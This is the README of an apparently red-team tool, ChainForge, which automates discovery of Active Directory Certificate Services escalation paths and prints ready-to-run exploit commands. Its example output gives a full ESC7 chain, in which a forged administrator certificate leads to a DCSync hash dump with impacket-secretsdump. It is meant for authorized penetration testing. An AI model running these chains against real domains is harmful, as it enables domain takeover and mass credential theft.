# ChainForge v1.0

**ADCS Attack Chain Triage & Resolution**

Enumerate → Triage → Chain → Domain Admin

ChainForge automates Active Directory Certificate Services (AD CS) vulnerability assessment. It identifies exploitable ESC paths, generates copy-pasteable exploit commands with real values, and chains findings across phases to surface complete attack paths from initial access to domain compromise.

---

## Quick Start

```bash
# Basic scan (no BloodHound/Neo4j)
python3 chainforge.py -u <user> -p '<password>' -d <domain> --dc-ip <dc_ip>

# Full pipeline — collect, import, graph analysis, ADCS triage
python3 chainforge.py -u <user> -p '<password>' -d <domain> --dc-ip <dc_ip> --bloodhound --neo4j

# Save output to file
python3 chainforge.py -u <user> -p '<password>' -d <domain> --dc-ip <dc_ip> --output results.txt
```

On first run, ChainForge checks for all required tools and offers to install anything missing with a single prompt.

---

## What It Does

ChainForge runs a phased assessment against an AD CS environment and produces a tiered attack path summary with ready-to-execute commands.

**Phase 0 — User Context:** Authenticates, enumerates group memberships, determines privilege level (low-priv vs DA/admin), sweeps the subnet for admin access, and resolves the Administrator SID for use in all downstream commands.

**Phase 1 — CA-Level Misconfigurations:** Detects ESC6 (User Specified SAN), ESC7 (ManageCA/ManageCertificates ACL abuse), ESC8 (web enrollment relay), ESC9 (CT_FLAG_NO_SECURITY_EXTENSION), ESC11 (RPC encryption), ESC13 (OID-to-group links), and ESC15 (Schema v1 EKU override).

**Phase 2 — Certificate Binding Enforcement:** Checks StrongCertificateBindingEnforcement registry value, enumerates userPrincipalName-writable objects via bloodyAD, identifies enrollable Client Auth templates, and confirms ESC10 exploitability when all three conditions are met.

**Phase 3 — Template Triage:** Enumerates all enabled certificate templates for ESC1 (SAN + Client Auth), ESC2 (Any Purpose EKU), ESC3 (Enrollment Agent), and ESC4 (writable template ACLs). Identifies ESC2/ESC3 target templates for chain completion.

**Phase 4 — Pivot Opportunities:** Checks MachineAccountQuota for machine account creation, enumerates Kerberoastable SPNs, discovers unconstrained delegation targets, and cross-references GenericWrite access for TGT capture chains.

**Phase 5 — Privileged Endgame (admin users only):** Surfaces SubCA template exploitation, CA private key extraction (DPERSIST1), Golden Certificate forging, DCSync, certificate-based persistence (PERSIST1/2), and rogue CA injection (DPERSIST2).

**Phase 6 — Shadow Credentials:** Checks msDS-KeyCredentialLink write access on all domain users and computers. Cross-references with Phase 2 results to identify complete Shadow Creds → ESC10 → DA chains.

**Graph Analysis (optional):** Connects to Neo4j with imported BloodHound data and runs 6 targeted Cypher queries: shortest path to DA, ACL abuse on users/computers (direct + group-transitive), DCSync paths, AdminTo paths, and dangerous edges from low-privilege groups. Discovered writable targets feed into Phases 2 and 6 to catch multi-hop ACL chains that single-hop tools miss.

**Chain Resolver:** Cross-references findings across all phases. When Shadow Credentials (Phase 6) can unlock ESC10 (Phase 2), it surfaces the complete multi-step chain with ordered commands.

---

## Output

Every finding includes:

- **Severity rating** — CRIT, HIGH, MED, INFO
- **Exploit commands** — copy-pasteable with real SIDs, CA names, hostnames, and credentials
- **DCSync** — every chain ends with domain hash dump (Kerberos TGT + NT hash fallback)
- **Cleanup steps** — remove officer rights, disable templates, delete artifacts
- **Tiered summary** — Tier 1 (execute now), Tier 2 (requires extra steps), Tier 3 (pivot/partial)

Example ESC7 output:

```
  [CRIT] ESC7 — Dangerous CA ACL (ManageCA / ManageCertificates)
         Commands:
           # Step 1 — add self as Certificate Officer
           $ certipy-ad ca -u frank@CORP.local -p '...' -ca CORP-CA -add-officer frank
           # Step 2 — enable SubCA template
           $ certipy-ad ca -u frank@CORP.local -p '...' -ca CORP-CA -enable-template SubCA
           # Step 3 — request cert (will fail — SAVE THE PRIVATE KEY)
           $ certipy-ad req ... -template SubCA -upn administrator@CORP.local -sid S-1-5-...
           # Step 4 — force-issue the denied request
           $ certipy-ad ca ... -issue-request <REQUEST_ID>
           # Step 5 — retrieve the certificate
           $ certipy-ad req ... -retrieve <REQUEST_ID>
           # Step 6 — authenticate → TGT + NT hash
           $ certipy-ad auth -pfx administrator.pfx ...
           # Step 7 — DCSync
           $ impacket-secretsdump CORP.local/administrator@<DC_IP> -hashes <LM:NT> -just-dc-ntlm
           # ── CLEANUP ──
           $ certipy-ad ca ... -remove-officer frank
           $ certipy-ad ca ... -disable-template SubCA
           $ rm -f administrator.pfx administrator.ccache *.key
```

---

## Requirements

ChainForge auto-installs missing tools on first run (with user permission). The full toolset:

| Tool | Purpose | Install |
|------|---------|---------|
| certipy-ad | ADCS enumeration + exploitation | `pip3 install certipy-ad` |
| netexec | SMB auth, MAQ, registry checks | `pip3 install netexec` |
| impacket | SPNs, delegation, DCSync, machine accounts | `pip3 install impacket` |
| ldapsearch | LDAP group/SID queries | `apt install ldap-utils` |
| bloodhound-python | BloodHound data collection | `pip3 install bloodhound` |
| bloodhound-import | Neo4j data import | `pip3 install bloodhound-import` |
| neo4j (Python driver) | Graph analysis queries | `pip3 install neo4j` |
| bloodyAD | ACL/attribute write checks | Auto-cloned from GitHub |
| bloodhound-quickwin | Supplementary graph analysis | Auto-cloned from GitHub |
| git | Cloning bloodyAD/quickwin | Pre-installed on Kali |

**For graph analysis (`--neo4j`)**, you need Neo4j running with BloodHound data imported. The easiest path is BloodHound Community Edition via Docker:

```bash
# Install Docker
sudo apt install -y docker.io
sudo systemctl enable docker --now

# Install docker-compose
sudo apt install -y docker-compose

# Install BH CE
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install

# Expose Neo4j ports for ChainForge
sudo sed -i 's/#.*- 127.0.0.1:${NEO4J_DB_PORT:-7687}:7687/    - "127.0.0.1:7687:7687"/' /root/.config/bloodhound/docker-compose.yml
sudo sed -i 's/#.*- 127.0.0.1:${NEO4J_WEB_PORT:-7474}:7474/    - "127.0.0.1:7474:7474"/' /root/.config/bloodhound/docker-compose.yml

# Restart
sudo ./bloodhound-cli containers down
sudo ./bloodhound-cli containers up
```

The `--bloodhound` flag handles collection, extraction, and import automatically. The `--neo4j` flag uses the BH CE default credentials (`neo4j` / `bloodhoundcommunityedition`).

---

## Usage

```
usage: chainforge.py [-h] -u USER -p PASSWORD -d DOMAIN --dc-ip DC_IP
                     [--output OUTPUT] [--bloodhound] [--neo4j]
                     [--neo4j-url NEO4J_URL] [--neo4j-user NEO4J_USER]
                     [--neo4j-pass NEO4J_PASS]

options:
  -u, --user            Domain username
  -p, --password        Domain password
  -d, --domain          Target domain (e.g. CORP.local)
  --dc-ip               Domain Controller IP address
  --output, -o          Save output to file (ANSI stripped)
  --bloodhound, -bh     Collect BloodHound data, extract, and import into Neo4j
  --neo4j               Enable graph analysis with BH CE defaults
  --neo4j-url           Neo4j Bolt URL (default: bolt://127.0.0.1:7687)
  --neo4j-user          Neo4j username (default: neo4j)
  --neo4j-pass          Neo4j password (default: bloodhoundcommunityedition)
```

**Common workflows:**

```bash
# Low-priv user, basic ADCS scan
python3 chainforge.py -u dan -p '<pass>' -d CORP.local --dc-ip 10.0.0.1

# Full pipeline with graph analysis
python3 chainforge.py -u dan -p '<pass>' -d CORP.local --dc-ip 10.0.0.1 --bloodhound --neo4j

# Admin user, save results
python3 chainforge.py -u admin -p '<pass>' -d CORP.local --dc-ip 10.0.0.1 --neo4j -o report.txt

# Custom Neo4j instance
python3 chainforge.py -u dan -p '<pass>' -d CORP.local --dc-ip 10.0.0.1 \
  --neo4j-url bolt://10.0.0.5:7687 --neo4j-pass custompassword
```

---

## ESC Coverage

| ESC | Description | Phase | Detection |
|-----|-------------|-------|-----------|
| ESC1 | SAN + Client Auth + low-priv enrollment | 3 | Template flags + enrollment rights |
| ESC2 | Any Purpose EKU | 3 | Template EKU + enrollment rights |
| ESC3 | Enrollment Agent | 3 | Agent template + target template pairing |
| ESC4 | Writable template ACL | 3 | WriteOwner/WriteDACL/FullControl on templates |
| ESC6 | User Specified SAN on CA | 1 | CA configuration flags |
| ESC7 | ManageCA / ManageCertificates | 1 | CA ACL rights + SubCA chain |
| ESC8 | Web enrollment (NTLM relay) | 1 | HTTP/HTTPS enrollment endpoints |
| ESC9 | CT_FLAG_NO_SECURITY_EXTENSION | 1 | Template enrollment flags |
| ESC10 | Weak certificate binding | 2 | Registry + GenericWrite + Client Auth template |
| ESC11 | RPC encryption not enforced | 1 | CA encryption policy |
| ESC13 | OID-to-group link | 1 | Issuance policy OID + msDS-OIDToGroupLink |
| ESC15 | Schema v1 EKU override | 1, 3 | Schema version + EnrolleeSuppliesSubject |

Additional checks: Kerberoasting, unconstrained delegation, MachineAccountQuota, shadow credentials (msDS-KeyCredentialLink), BloodHound graph ACL paths (GenericWrite, WriteDACL, WriteOwner, AddKeyCredentialLink, etc.).

---

## Architecture

```
chainforge.py
├── Preflight          Check/install 11 tools, single prompt
├── CA Detection       Certipy + netexec fallback
├── Phase 0            Auth, groups, priv level, SMB sweep, SID resolve
├── BloodHound         Collect → bh_data/ → unzip → Neo4j import
├── Graph Analysis     6 Cypher queries + bloodhound-quickwin
├── Phase 1            CA-level: ESC6, ESC7, ESC8, ESC9, ESC11, ESC13, ESC15
├── Phase 2            Binding enforcement: ESC9/ESC10 conditions
├── Phase 3            Template triage: ESC1, ESC2, ESC3, ESC4
├── Phase 4            MAQ, Kerberoast, delegation, TGT capture
├── Phase 5            Privileged endgame: SubCA, DCSync, persistence
├── Phase 6            Shadow credentials + graph target merge
├── Chain Resolver     Cross-phase chain assembly (Shadow Creds → ESC10 → DA)
└── Summary            Tiered attack paths (Tier 1/2/3)
```

**Key design decisions:**

- **Priv-aware gating** — low-priv users get Phases 2/4/6, admins get Phase 5. Irrelevant phases are skipped, not shown.
- **Certipy output caching** — full and vulnerable scans cached so Certipy runs once, not per-phase.
- **Version-tolerant parsing** — `_certipy_field()` helpers use flexible regex instead of hardcoded whitespace, works across Certipy v4/v5.
- **Graph target merging** — Neo4j-discovered writable targets feed into Phase 2 (ESC10) and Phase 6 (shadow creds) when bloodyAD's single-hop checks miss multi-hop ACL paths.
- **Shell-safe commands** — all passwords handled via `shlex.quote()` to prevent breakage on special characters.

---

## Disclaimer

ChainForge is a security assessment tool intended for authorized penetration testing and red team engagements only. Only use this tool against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.

---

## Credits

Built on top of:

- [Certipy](https://github.com/ly4k/Certipy) by Oliver Lyak
- [Impacket](https://github.com/fortra/impacket) by Fortra
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) by CravateRouge
- [NetExec](https://github.com/Pennyw0rth/NetExec) by Pennyw0rth
- [BloodHound](https://github.com/SpecterOps/BloodHound) by SpecterOps
- [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) by Dirk-jan
- [bloodhound-quickwin](https://github.com/kaluche/bloodhound-quickwin) by Kaluche

AD CS escalation research by [SpecterOps](https://specterops.io/), [Will Schroeder](https://twitter.com/harmj0y), [Lee Christensen](https://twitter.com/tifkin_), and [Oliver Lyak](https://twitter.com/ly4k_).
